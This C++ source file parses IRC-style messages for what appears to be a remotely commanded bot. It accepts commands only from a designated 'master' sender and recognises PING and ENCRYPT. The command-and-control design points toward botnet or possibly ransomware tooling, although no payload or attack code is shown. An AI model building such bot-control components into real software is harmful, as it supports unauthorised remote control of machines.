#include "MessageParser.hpp"
#include "ActionType.hpp"


bool compareCString(const char* cString, const char* actionType) {
    return strcmp(cString, actionType) == 0;
}

std::vector<std::string> buildParams(std::string receivedMessage) {
    std::vector<std::string> result;
    std::istringstream iss(receivedMessage);
    std::string param;
    while (iss >> param) {
        result.push_back(param);
    }
    return result;
}

ActionInfo MessageParser::parseMessage(std::string receivedMessage, const char* expectedSender) {
    std::vector<std::string> messageParams = buildParams(receivedMessage);

    for (int i = 0; i < messageParams.size(); i++) {
        printf("Param[%d]: %s\n", i, messageParams[i].c_str());
    }

    if (messageParams.size() < MessageParser::MIN_PARAMS) {
        return ActionInfo(ActionType::UNKNOWN, std::vector<std::string>());
    }

    // Ensure that sender is from the master program
    const char* sender = messageParams[MessageParser::SENDER_IDX].c_str();
    if (!compareCString(sender, expectedSender)) {
        return ActionInfo(ActionType::UNKNOWN, std::vector<std::string>()); 
    }

    const char* msgType = messageParams[MessageParser::MSG_TYPE_IDX].c_str();
    if (!compareCString(msgType, "MSG") && !compareCString(msgType, "PRIVMSG")) { // Only general messages and private messages can contain bot commands
        return ActionInfo(ActionType::UNKNOWN, std::vector<std::string>());
    }

    // Determine what type, if any, the command is
    const char* strActionType = messageParams[MessageParser::ACTION_TYPE_IDX].c_str();
    ActionType actionType;
    if (compareCString(strActionType, "PING")) {
        actionType = ActionType::PING;
    } else if (compareCString(strActionType, "ENCRYPT")) {
        actionType = ActionType::ENCRYPT;
    } else {
        actionType = ActionType::UNKNOWN;
    }

    return ActionInfo(actionType, messageParams);
}
